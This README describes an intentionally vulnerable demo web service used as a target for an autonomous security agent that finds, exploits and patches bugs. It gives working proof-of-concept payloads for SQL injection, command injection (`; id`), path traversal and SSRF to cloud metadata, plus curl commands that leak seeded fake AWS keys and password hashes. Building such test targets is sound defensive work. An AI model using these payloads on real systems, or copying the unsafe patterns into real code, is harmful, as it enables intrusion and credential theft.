# ☣️ Tartarus-Patient-Zero

> **INTENTIONALLY VULNERABLE.** A deliberately insecure demo service used as the
> target for the [Tartarus](../../README.md) autonomous SecOps agent. **Never deploy this.**

It contains **four** classic, multi-vector bugs for the agent to find, prove, and patch:

| Endpoint | Vulnerability | Proof-of-concept |
|----------|---------------|------------------|
| `GET /users?name=` | **SQL Injection**, the `name` param is concatenated into the query. | `/users?name=x' OR '1'='1` leaks every user's `secret`; a `UNION` reads `admin_tokens`. |
| `GET /ping?host=` | **Command Injection**, the `host` param is passed to `execSync`. | `/ping?host=127.0.0.1; id` runs arbitrary shell commands. |
| `GET /file?name=` | **Path Traversal**, `name` is joined onto the public dir with no containment check. | `/file?name=../../flag.txt` reads the secret `flag.txt` outside the web root. |
| `GET /fetch?url=` | **SSRF**, the server fetches any user-supplied URL. | `/fetch?url=http://169.254.169.254/latest/meta-data/` reaches internal/metadata endpoints. |

The database is **file-backed and seeded with fake secrets** (fake AWS keys +
admin password hashes, see [`src/init_db.js`](src/init_db.js)), so a successful
injection leaks concrete data. It uses Node's built-in **`node:sqlite`**, so there
is **no native module to compile**, it runs identically on a laptop and inside
the Daytona sandbox.

## Run it locally

```bash
npm install          # also seeds patient-zero.db (postinstall)
npm start            # http://localhost:4000

# benign, returns only alice:
curl "http://localhost:4000/users?name=alice"

# 💥 injection, leaks ALL users' secret AWS keys:
curl "http://localhost:4000/users?name=x'%20OR%20'1'='1"

# 💥 UNION, pulls admin password hashes out of a different table:
curl "http://localhost:4000/users?name=z'%20UNION%20SELECT%20id,username,pw_hash,pw_hash%20FROM%20admin_tokens--%20"
```

The injection response leaks exactly the data that should never be public:

```json
{ "rows": [
  { "name": "alice", "secret": "AKIAFAKEALICE0000/wJalrFakeSecretKeyEXAMPLE01" },
  { "name": "bob",   "secret": "AKIAFAKEBOB000000/wJalrFakeSecretKeyEXAMPLE02" },
  { "name": "carol", "secret": "AKIAFAKECAROL0000/wJalrFakeSecretKeyEXAMPLE03" }
] }
```

## Use as the agent's live target

1. Push this folder to GitHub as its own repository, e.g. `your-org/Tartarus-Patient-Zero`.
2. In Tartarus's `.env`, set `TARGET_REPO=your-org/Tartarus-Patient-Zero`.
3. Run `npm run hunt`, Tartarus will scan it, detonate an exploit in the sandbox, ask for approval, and open a fix PR.

## The known-good fix

[`src/app.patched.reference.js`](src/app.patched.reference.js) is the reference
remediation (parameterised query + `execFile` with validation). Compare the
agent's real PR against it to confirm the fix is correct.
